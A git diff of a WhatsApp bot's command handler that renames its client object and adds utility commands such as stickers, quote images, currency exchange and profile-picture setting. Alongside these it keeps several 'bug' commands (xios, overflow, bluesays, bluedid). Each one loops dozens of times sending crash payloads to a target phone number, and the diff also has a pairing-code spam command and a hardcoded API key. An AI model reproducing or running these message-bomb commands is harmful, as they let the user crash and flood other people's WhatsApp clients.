-                    await zyn.groupParticipantsUpdate(m.chat, [users], 'promote');
+                    await blue.groupParticipantsUpdate(m.chat, [users], 'promote');
                     bluereply(mess.success);
                 } catch (err) {
                     // Handle errors during the promotion process
@@ -1930,7 +1978,7 @@ END:VCARD`
 
                 try {
                     // Attempt to demote the user from admin role
-                    await zyn.groupParticipantsUpdate(m.chat, [users], 'demote');
+                    await blue.groupParticipantsUpdate(m.chat, [users], 'demote');
                     bluereply(mess.success);
                 } catch (err) {
                     // Handle errors during the demotion process
@@ -1950,7 +1998,7 @@ END:VCARD`
 
                 try {
                     // Mute the group (only admins can send messages)
-                    await zyn.groupSettingUpdate(m.chat, 'announcement');
+                    await blue.groupSettingUpdate(m.chat, 'announcement');
                     bluereply(mess.success);
                 } catch (err) {
                     console.error(err);
@@ -1970,7 +2018,7 @@ END:VCARD`
 
                 try {
                     // Unmute the group (everyone can send messages)
-                    await zyn.groupSettingUpdate(m.chat, 'not_announcement');
+                    await blue.groupSettingUpdate(m.chat, 'not_announcement');
                     bluereply(mess.success);
                 } catch (err) {
                     console.error(err);
@@ -1979,7 +2027,7 @@ END:VCARD`
                 break;
             }
             case 'invite': {
-                if (!m.isGroup) return reply(mess.only.grouo);
+                if (!isGroup) return reply(mess.only.grouo);
                 if (!isBotAdmins) return reply(mess.only.admin);
                 if (!text) return reply(`Enter the number you want to invite to the group.\n\nExample:\n*${prefix + command}* 255734980103`);
                 if (text.includes('+')) return reply(`Please enter the number without the "+" symbol.`);
@@ -1987,8 +2035,8 @@ END:VCARD`
 
                 let group = m.chat;
                 try {
-                    let link = 'https://chat.whatsapp.com/' + await zyn.groupInviteCode(group);
-                    await zyn.sendMessage(text + '@s.whatsapp.net', {
+                    let link = 'https://chat.whatsapp.com/' + await blue.groupInviteCode(group);
+                    await blue.sendMessage(text + '@s.whatsapp.net', {
                         text: `🔪 *WAGWAN*\n*GROUP INVITATION*\n\n\`You are invited to join ${groupMetadata.subject}:\`🚶🚶\n\n${link}`,
                         mentions: [m.sender]
                     });
@@ -2001,11 +2049,37 @@ END:VCARD`
             }
             case 'leavegc': {
                 if (!isOwner) return reply(mess.only.owner);
-                await zyn.groupLeave(m.chat)
+                await blue.groupLeave(m.chat)
                     .then((res) => reply(JSON.stringify(res)))
                     .catch((err) => reply(JSON.stringify(err)));
                 break;
             }
+         case 'setname':
+         case 'setbotname':{
+if (!isOwner) return reply(mess.only.owner)
+if (!text) return reply(`Example: ${prefix + command} *BLUE DEMON*`)
+    await blue.updateProfileName(text)
+    reply(`*SUCCESSFULLY CHANGE NAME TO ${text}*`)
+    }
+    break
+  case 'setgcname':  case 'setnamegc': case 'setgroupname': case 'setsubject': {
+if (!isGroup) return reply(mess.only.group)
+if (!isBotAdmins) return reply(mess.only.badmin)
+if (!isAdmins) return reply(mess.only.admin)
+if (!text) return reply('*HUH?*')
+await blue.groupUpdateSubject(m.chat, text)
+await bluereply(mess.success)
+            }
+            break
+            case 'setdesc': case 'setdesk': {
+if (!isGroup) return reply(mess.only.group)
+if (!isBotAdmins) return reply(mess.only.badmin)
+if (!isAdmins) return reply(mess.only.admin)
+if (!text) return reply('*HUH?*')
+await blue.groupUpdateDescription(m.chat, text)
+await bluereply(mess.success)
+            }
+            break
             case 'closegroup':
             case 'closegc': {
                 if (!isGroup) return reply(mess.only.group);
@@ -2038,8 +2112,8 @@ END:VCARD`
                 reply('*The timer has started!*');
 
                 setTimeout(() => {
-                    zyn.groupSettingUpdate(m.chat, 'announcement')
-                        .then(() => reply('*Time is to rest 🤟*'))
+                    blue.groupSettingUpdate(m.chat, 'announcement')
+                        .then(() => reply('*Time  to rest 🤟*'))
                         .catch((err) => reply(`Failed to close the group: ${err.message}`));
                 }, timer);
             }
@@ -2076,7 +2150,7 @@ END:VCARD`
                 reply('*The timer has started!*');
 
                 setTimeout(() => {
-                    zyn.groupSettingUpdate(m.chat, 'not_announcement')
+                    blue.groupSettingUpdate(m.chat, 'not_announcement')
                         .then(() => reply('*Time is up!*'))
                         .catch((err) => reply(`Failed to open the group: ${err.message}`));
                 }, timer);
@@ -2098,7 +2172,7 @@ END:VCARD`
                     }
 
                     // Send the media directly as an image or video
-                    await zyn.sendMessage(m.chat, {
+                    await blue.sendMessage(m.chat, {
                         [type === 'imageMessage' ? 'image' : 'video']: buffer,
                         caption: msg[type].caption || '',
                         mimetype: type === 'imageMessage' ? 'image/jpeg' : 'video/mp4'
@@ -2114,7 +2188,7 @@ END:VCARD`
             break;
             case 'ai': {
                 if (!text) return reply(`*• Example:* ${prefix + command} Who was the person who discovered the computer in the Majapahit era?`);
-                await zyn.sendMessage(m.chat, {
+                await blue.sendMessage(m.chat, {
                     react: {
                         text: "🤔",
                         key: m.key,
@@ -2141,7 +2215,7 @@ END:VCARD`
                                         ...await prepareWAMessageMedia({
                                             image: fs.readFileSync('./database/image/hmm.jpg')
                                         }, {
-                                            upload: zyn.waUploadToServer
+                                            upload: blue.waUploadToServer
                                         })
                                     }),
                                     nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
@@ -2166,11 +2240,107 @@ END:VCARD`
                     }, {
                         quoted: m
                     })
-                    await zyn.relayMessage(m.chat, msgs.message, {})
+                    await blue.relayMessage(m.chat, msgs.message, {})
                 } catch (e) {
                     return reply("*Error* :(")
                 }
             }
+            case "qc": {
+                if (!isOwner) return reply(mess.only.owner)
+                if (!quoted) {
+                    const getname = await blue.getName(mentionUser[0])
+                    const json = {
+                        "type": "quote",
+                        "format": "png",
+                        "backgroundColor": "#1830c9",
+                        "width": 512,
+                        "height": 768,
+                        "scale": 2,
+                        "messages": [{
+                            "entities": [],
+                            "avatar": true,
+                            "from": {
+                                "id": 1,
+                                "name": getname,
+                                "photo": {
+                                    "url": ppuser
+                                }
+                            },
+                            "text": quotedMsg.chats,
+                            "replyMessage": {}
+                        }]
+                    };
+                    const response = axios.post('https://bot.lyo.su/quote/generate', json, {
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    }).then(res => {
+                        const buffer = Buffer.from(res.data.result.image, 'base64')
+                        const opt = {
+                            packname: global.packname,
+                            author: global.author
+                        }
+                        blue.sendStimg(from, buffer, m, opt)
+                    });
+                } else if (q) {
+                    const json = {
+                        "type": "quote",
+                        "format": "png",
+                        "backgroundColor": "#FFFFFF",
+                        "width": 512,
+                        "height": 768,
+                        "scale": 2,
+                        "messages": [{
+                            "entities": [],
+                            "avatar": true,
+                            "from": {
+                                "id": 1,
+                                "name": pushname,
+                                "photo": {
+                                    "url": ppuser
+                                }
+                            },
+                            "text": q,
+                            "replyMessage": {}
+                        }]
+                    };
+                    const response = axios.post('https://bot.lyo.su/quote/generate', json, {
+                        headers: {
+                            'Content-Type': 'application/json'
+                        }
+                    }).then(res => {
+                        const buffer = Buffer.from(res.data.result.image, 'base64')
+                        const opt = {
+                            packname: global.packname,
+                            author: global.author
+                        }
+                        blue.sendStimg(from, buffer, m, opt)
+                    });
+                } else {
+                    reply(`Send command ${prefix+command} blue`)
+                }
+            }
+            break
+
+case "sticker": 
+case "stiker":
+case "s": {
+if (!isOwner) return reply(mess.only.owner)
+if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
+if (/image/.test(mime)) {
+let media = await quoted.download()
+let encmedia = await blue.sendStimg(from, media, m, { packname: global.packname, author: global.author })
+await fs.unlinkSync(encmedia)
+} else if (/video/.test(mime)) {
+if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
+let media = await quoted.download()
+let encmedia = await blue.sendStvid(from, media, m, { packname: global.packname, author: global.author })
+await fs.unlinkSync(encmedia)
+} else {
+reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
+}
+}
+break
             break
             case 'enc':
             case 'encrypt':
@@ -2195,7 +2365,7 @@ END:VCARD`
                     }
 
                     // Send the session file as a document
-                    await zyn.sendMessage(m.chat, {
+                    await blue.sendMessage(m.chat, {
                         document: fs.readFileSync(credsPath), // Read the file
                         mimetype: 'application/json',
                         fileName: 'ᴄʀᴇᴅꜱ.ᴊꜱᴏɴ ʙy ʙʟᴜᴇxᴅᴇᴍᴏɴ' // Name of the file to send
@@ -2208,29 +2378,6 @@ END:VCARD`
                 }
                 break;
             }
-            case 'avs':
-            case 'autostatus': {
-                // Check if the user is the owner of the bot
-                if (!isOwner) return reply(mess.owner);
-
-                // Check for input argument
-                if (!q) return reply('ᴜꜱᴀɢᴇ: ᴏɴ/ᴏꜰꜰ');
-
-                if (q === 'on') {
-                    autoswview = true;
-                    reply(`ᴀᴜᴛᴏᴠɪᴇᴡꜱᴛᴀᴛᴜꜱ ʜᴀꜱ ʙᴇᴇɴ ᴇɴᴀʙʟᴇᴅ.`);
-                } else if (q === 'off') {
-                    autoswview = false;
-                    reply(`ᴀᴜᴛᴏᴠɪᴇᴡꜱᴛᴀᴛᴜꜱ ʜᴀꜱ ʙᴇᴇɴ ᴅɪꜱᴀʙʟᴇᴅ.`);
-                } else {
-                    reply('ɪɴᴠᴀʟɪᴅ ɪɴᴘᴜᴛ. ᴜꜱᴇ "ᴏɴ" ᴏʀ "ᴏꜰꜰ".');
-                }
-
-                break;
-            }
-
-            // Call autoViewStatus function at an appropriate place in your code
-            autoViewStatus();
             case 'listblock': {
                 // Check if the user is the owner or a premium user
                 if (!isOwner && !isPremium) {
@@ -2238,8 +2385,8 @@ END:VCARD`
                 }
 
                 try {
-                    // Fetch the blocklist using your zyn file structure
-                    let block = await zyn.fetchBlocklist();
+                    // Fetch the blocklist using your blue file structure
+                    let block = await blue.fetchBlocklist();
 
                     // Prepare the message showing the number of blocked users and their details
                     let blockMessage = `*List of Blocked Users*:\n\n` +
@@ -2268,6 +2415,37 @@ END:VCARD`
                 reply(lowq);
             }
             break;
+               async function autoViewStatus() {
+                    if (autoswview) {
+                        // Fetch the list of statuses
+                        let statusList = await blue.fetchStatusUpdates();
+                        for (let status of statusList) {
+                            // Automatically view each status
+                            await blue.readStatus(status.id);
+                        }
+                    }
+                }
+case 'avs':
+            case 'autostatus': {
+                // Check if the user is the owner of the bot
+                if (!isOwner) return reply(mess.owner);
+
+                // Check for input argument
+                if (!q) return reply('ᴜꜱᴀɢᴇ: ᴏɴ/ᴏꜰꜰ');
+
+                if (q === 'on') {
+                    autoswview = true;
+                    reply(`ᴀᴜᴛᴏᴠɪᴇᴡꜱᴛᴀᴛᴜꜱ ʜᴀꜱ ʙᴇᴇɴ ᴇɴᴀʙʟᴇᴅ.`);
+                } else if (q === 'off') {
+                    autoswview = false;
+                    reply(`ᴀᴜᴛᴏᴠɪᴇᴡꜱᴛᴀᴛᴜꜱ ʜᴀꜱ ʙᴇᴇɴ ᴅɪꜱᴀʙʟᴇᴅ.`);
+                } else {
+                    reply('ɪɴᴠᴀʟɪᴅ ɪɴᴘᴜᴛ. ᴜꜱᴇ "ᴏɴ" ᴏʀ "ᴏꜰꜰ".');
+                }
+
+                break;
+            }
+            autoViewStatus();
             case 'totalcase':
             case 'totalcmd':
             case 'totalcommand':
@@ -2286,14 +2464,14 @@ END:VCARD`
                     }
 
                     const ipMessage = `*𝐈𝐏 𝐀𝐃𝐃𝐑𝐄𝐒𝐒 𝐁𝐘 𝐃𝐄𝐌𝐎𝐍:* *\`${apiResponse.ip}\`*`;
-                    zyn.sendMessage(m.chat, {
+                    blue.sendMessage(m.chat, {
                         text: ipMessage
                     }, {
                         quoted: m
                     });
                 } catch (error) {
                     console.error(error);
-                    zyn.sendMessage(m.chat, {
+                    blue.sendMessage(m.chat, {
                         text: 'An error occurred: ' + error.message
                     }, {
                         quoted: m
@@ -2301,44 +2479,8 @@ END:VCARD`
                 }
                 break;
             }
-            case 'sticker':
-            case 's': {
-                if (!isOwner) return reply(mess.only.owner); // Check if the user is the owner
-                if (!quoted) return reply(`Send/Reply to Images/Videos/Gifs with the caption ${prefix + command}\nVideo Duration: 1-9 Seconds`); // Ensure there’s a quoted message
-
-                try {
-                    let mime = quoted.mimetype || '';
-
-                    if (/image/.test(mime)) { // If the quoted message is an image
-                        let media = await quoted.download(); // Download the image
-                        await zyn.sendStimg(m.chat, media, m, {
-                            packname: global.packname,
-                            author: global.author
-                        }); // Send the image as a sticker
-
-                    } else if (/video/.test(mime)) { // If the quoted message is a video
-                        if ((quoted.msg || quoted).seconds > 9) { // Check video length (should be 1-9 seconds)
-                            return reply(`Send/Reply to Images/Videos/Gifs with the caption ${prefix + command}\nVideo Duration: 1-9 Seconds`);
-                        }
-                        let media = await quoted.download(); // Download the video
-                        await zyn.sendStvid(m.chat, media, m, {
-                            packname: global.packname,
-                            author: global.author
-                        }); // Send the video as a sticker
-
-                    } else {
-                        reply(`Send/Reply to Images/Videos/Gifs with the caption ${prefix + command}\nVideo Duration: 1-9 Seconds`); // Handle unsupported media
-                    }
-
-                } catch (error) {
-                    console.error(error);
-                    reply("An error occurred while processing the sticker. Please try again.");
-                }
-            }
-            break;
             case 'hrt':
             case 'love': {
-                if (!isOwner) return bluereply(mess.owner);
 
                 // Array of heart emojis to send one by one
                 const heartEmojis = [
@@ -2348,7 +2490,7 @@ END:VCARD`
                 ];
 
                 // Send the initial message
-                const loveMsg = await zyn.sendMessage(m.chat, {
+                const loveMsg = await blue.sendMessage(m.chat, {
                     text: heartEmojis[0]
                 }, {
                     quoted: m
@@ -2357,7 +2499,7 @@ END:VCARD`
                 // Function to update the message with new emojis
                 const updateMessage = async (index = 1) => {
                     if (index < heartEmojis.length) {
-                        await zyn.relayMessage(m.chat, {
+                        await blue.relayMessage(m.chat, {
                             protocolMessage: {
                                 key: loveMsg.key,
                                 type: 14,
@@ -2378,8 +2520,6 @@ END:VCARD`
             }
             case 'confuse':
             case 'conf': {
-                if (!isOwner) return reply(mess.owner);
-
                 // Array of confused-themed emojis to send one by one
                 const confusedEmojis = [
                     '😕', '🤔', '😵', '😵‍💫', '🤷', '🤷‍♂️', '🤷‍♀️', '😮‍💨', '😐', '🤨',
@@ -2387,7 +2527,7 @@ END:VCARD`
                 ];
 
                 // Send the initial confused emoji
-                const confuseMsg = await zyn.sendMessage(m.chat, {
+                const confuseMsg = await blue.sendMessage(m.chat, {
                     text: confusedEmojis[0]
                 }, {
                     quoted: m
@@ -2396,7 +2536,7 @@ END:VCARD`
                 // Function to update the message with new confused emojis
                 const updateMessage = async (index = 1) => {
                     if (index < confusedEmojis.length) {
-                        await zyn.relayMessage(m.chat, {
+                        await blue.relayMessage(m.chat, {
                             protocolMessage: {
                                 key: confuseMsg.key,
                                 type: 14,
@@ -2417,8 +2557,6 @@ END:VCARD`
             }
             case 'angry':
             case 'gtf': {
-                if (!isOwner) return bluereply(mess.owner);
-
                 // Array of angry-themed stickers/emojis to send one by one
                 const angryEmojis = [
                     '😡', '😠', '🤬', '👿', '💢', '🔥', '😾', '😤', '🤯', '💥',
@@ -2427,7 +2565,7 @@ END:VCARD`
                 ];
 
                 // Send the initial angry emoji
-                const angryMsg = await zyn.sendMessage(m.chat, {
+                const angryMsg = await blue.sendMessage(m.chat, {
                     text: angryEmojis[0]
                 }, {
                     quoted: m
@@ -2436,7 +2574,7 @@ END:VCARD`
                 // Function to update the message with new emojis/stickers
                 const updateMessage = async (index = 1) => {
                     if (index < angryEmojis.length) {
-                        await zyn.relayMessage(m.chat, {
+                        await blue.relayMessage(m.chat, {
                             protocolMessage: {
                                 key: angryMsg.key,
                                 type: 14,
@@ -2455,7 +2593,35 @@ END:VCARD`
                 setTimeout(() => updateMessage(), 1000);
                 break;
             }
-            
+case 'exchange': {
+    if (!args[0] || !args[1] || !args[2]) return reply('\nExample: exchange 100 USD EUR');
+
+    const amount = parseFloat(args[0]);
+    const fromCurrency = args[1].toUpperCase();
+    const toCurrency = args[2].toUpperCase();
+    
+    if (isNaN(amount)) return reply('Please enter a valid amount.');
+
+    try {
+        // Send request to ExchangeRate API
+        const apiKey = '43f31fb84c391ced11b216a4';
+        const url = `https://v6.exchangerate-api.com/v6/${apiKey}/pair/${fromCurrency}/${toCurrency}`;
+
+        const response = await axios.get(url);
+        const exchangeRate = response.data.conversion_rate;
+
+        // Calculate converted amount
+        const convertedAmount = (amount * exchangeRate).toFixed(2);
+
+        // Reply with conversion result
+        reply(`💱 *Currency Exchange*\n\n*Amount:* ${amount} ${fromCurrency}\n*Converted Amount:* ${convertedAmount} ${toCurrency}\n*Exchange Rate:* 1 ${fromCurrency} = ${exchangeRate} ${toCurrency}
+> ʙʟᴜᴇᴅᴇᴍᴏɴ`);
+    } catch (error) {
+        console.error(error);
+        reply('Error: Unable to retrieve exchange rates. Please try again later.');
+    }
+    break;
+}
             case 'spampair': {
                 const usePairingCode = true
                 const NodeCache = require("node-cache")
@@ -2498,9 +2664,21 @@ END:VCARD`
                 await sleep(2000)
             }
             break
+case 'acc':
+case 'aza': {
+                let bankDetails = `*BANK DETAILS*\n` +
+                    `👾 _*BOLAJI*_\n\n` +
+                    `🔢 7041039367\n\n` +
+                    `🏦 _*OPAY*_\n` +
+                    `*DROP SCREENSHOT AFTER PAYMENT ASAPUU🔪*`;
 
-
-
+                reply(bankDetails);
+                break;
+            }
+case 'nice': {
+                reply(`*${pushname}* *𝑻𝒉𝒂𝒏𝒌 𝒚𝒐𝒖 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒄𝒐𝒎𝒑𝒍𝒊𝒎𝒆𝒏𝒕*`)
+            }
+            break
             case 'tempban': {
                 if (!isOwner) return reply(mess.only.owner)
                 if (!text) return reply(`Example: ${prefix + command} 62|8xxx`)
@@ -2555,7 +2733,18 @@ END:VCARD`
                 }, 400)
             }
             break
-
+case 'getpp':{
+if (!m.isGroup) return reply (mess.only.group)
+let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+let ghosst = userss
+	try {
+   var ppuser = await blue.profilePictureUrl(ghosst, 'image')
+} catch (err) {
+   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
+}
+blue.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
+}
+break 
 
             case 'antibugon': {
                 if (!isOwner) return reply(mess.only.owner)
@@ -2576,14 +2765,14 @@ END:VCARD`
                 target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                 reply(bugres)
                 for (let i = 0; i < 50; i++) {
-                    await buk1(zyn, target, "p", 1020000, ptcp = true);
+                    await buk1(blue, target, "p", 1020000, ptcp = true);
                     sendQP(target, wanted)
                     await sendQP(target, wanted)
-                    await beta2(zyn, target, wanted)
+                    await beta2(blue, target, wanted)
                     await sendSessionStructure(target, wanted)
-                    await beta1(zyn, target, wanted)
+                    await beta1(blue, target, wanted)
                 }
-                reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
+                reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`)
                 break
 
             case 'bluesays':
@@ -2592,14 +2781,14 @@ END:VCARD`
                 target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                 reply(bugres)
                 for (let i = 0; i < 50; i++) {
-                    await buk1(zyn, target, "p", 1020000, ptcp = true);
+                    await buk1(blue, target, "p", 1020000, ptcp = true);
                     sendQP(target, wanted)
                     await sendQP(target, wanted)
-                    await beta2(zyn, target, wanted)
+                    await beta2(blue, target, wanted)
                     await sendSessionStructure(target, wanted)
-                    await beta1(zyn, target, wanted)
+                    await beta1(blue, target, wanted)
                 }
-                reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
+                reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`)
                 break
 
             case 'bluedid':
@@ -2608,14 +2797,14 @@ END:VCARD`
                 target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                 reply(bugres)
                 for (let i = 0; i < 30; i++) {
-                    await buk1(zyn, target, "p", 1020000, ptcp = true);
+                    await buk1(blue, target, "p", 1020000, ptcp = true);
                     sendQP(target, wanted)
                     await sendQP(target, wanted)
-                    await beta2(zyn, target, wanted)
+                    await beta2(blue, target, wanted)
                     await sendSessionStructure(target, wanted)
-                    await beta1(zyn, target, wanted)
+                    await beta1(blue, target, wanted)
                 }
-                reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
+                reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`)
                 break
 
             case 'xios':
@@ -2625,13 +2814,13 @@ END:VCARD`
                 target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                 reply(bugres)
                 for (let i = 0; i < 40; i++) {
-                    await buk1(zyn, target, "p", 1020000, ptcp = true);
+                    await buk1(blue, target, "p", 1020000, ptcp = true);
                     await sendQP(target, wanted)
-                    await beta2(zyn, target, wanted)
+                    await beta2(blue, target, wanted)
                     await sendSessionStructure(target, wanted)
-                    await beta1(zyn, target, wanted)
+                    await beta1(blue, target, wanted)
                 }
-                reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
+                reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`)
                 break
 
             case 'overflow':
@@ -2642,14 +2831,14 @@ END:VCARD`
                 target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                 reply(bugres)
                 for (let i = 0; i < 40; i++) {
-                    await buk1(zyn, target, "p", 1020000, ptcp = true);
+                    await buk1(blue, target, "p", 1020000, ptcp = true);
                     sendQP(target, wanted)
                     await sendQP(target, wanted)
-                    await beta2(zyn, target, wanted)
+                    await beta2(blue, target, wanted)
                     await sendSessionStructure(target, wanted)
-                    await beta1(zyn, target, wanted)
+                    await beta1(blue, target, wanted)
                 }
-                reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
+                reply(`𝗕𝘂𝗴 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 ${target}`)
                 break
 
 
@@ -2748,7 +2937,7 @@ END:VCARD`
                                         serverMessageId: -1
                                     },
                                     businessMessageForwardInfo: {
-                                        businessOwnerJid: zyn.decodeJid(zyn.user.id)
+                                        businessOwnerJid: blue.decodeJid(blue.user.id)
                                     },
                                 },
                                 body: proto.Message.InteractiveMessage.Body.create({
@@ -2764,7 +2953,7 @@ END:VCARD`
                                     ...(await prepareWAMessageMedia({
                                         image: await fs.readFileSync("./database/image/xbug.jpg")
                                     }, {
-                                        upload: zyn.waUploadToServer
+                                        upload: blue.waUploadToServer
                                     }))
                                 }),
                                 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
@@ -2781,12 +2970,43 @@ END:VCARD`
                     }
                 }, {})
 
-                await zyn.relayMessage(msg.key.remoteJid, msg.message, {
+                await blue.relayMessage(msg.key.remoteJid, msg.message, {
                     messageId: msg.key.id
                 })
             }
             break
-
+case 'setppbot': case 'setpp': {
+if (!isOwner) return reply(mess.only.owner)
+if (!quoted) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
+if (!/image/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
+if (/webp/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
+var medis = await blue.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
+if (args[0] == `full`) {
+var { img } = await generateProfilePicture(medis)
+await blue.query({
+tag: 'iq',
+attrs: {
+to: botNumber,
+type:'set',
+xmlns: 'w:profile:picture'
+},
+content: [
+{
+tag: 'picture',
+attrs: { type: 'image' },
+content: img
+}
+]
+})
+fs.unlinkSync(medis)
+reply(mess.success)
+} else {
+var memeg = await blue.updateProfilePicture(botNumber, { url: medis })
+fs.unlinkSync(medis)
+reply(mess.success)
+}
+}
+break
             case 'hdvid':
             case 'hdvideo':
             case 'vidiohd':
@@ -2798,13 +3018,13 @@ END:VCARD`
                 const {
                     exec
                 } = require('child_process');
-                const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? zyn.user.jid : m.sender;
-                //const name = await zyn.getName(who);
+                const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? blue.user.jid : m.sender;
+                //const name = await blue.getName(who);
                 const q = m.quoted ? m.quoted : m;
                 const mime = (q.msg || q).mimetype || '';
                 if (!mime) return m.reply(`Mana vidio nya bang?`);
                 reply(mess.wait);
-                const media = await zyn.downloadAndSaveMediaMessage(q);
+                const media = await blue.downloadAndSaveMediaMessage(q);
                 const url = await TelegraPh(media);
                 const output = 'output.mp4'; // Nama file output
                 // Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
@@ -2817,7 +3037,7 @@ END:VCARD`
                     console.error(`stderr: ${stderr}`);
 
                     // Mengunggah video yang telah ditingkatkan resolusinya
-                    zyn.sendMessage(m.chat, {
+                    blue.sendMessage(m.chat, {
                         caption: `_Success To HD Video_`,
                         video: {
                             url: output
@@ -2860,7 +3080,7 @@ END:VCARD`
         }
     } catch (e) {
         console.log(e)
-        zyn.sendMessage(`${owner}@s.whatsapp.net`, {
+        blue.sendMessage(`${owner}@s.whatsapp.net`, {
             text: `${util.format(e)}`
         })
     }
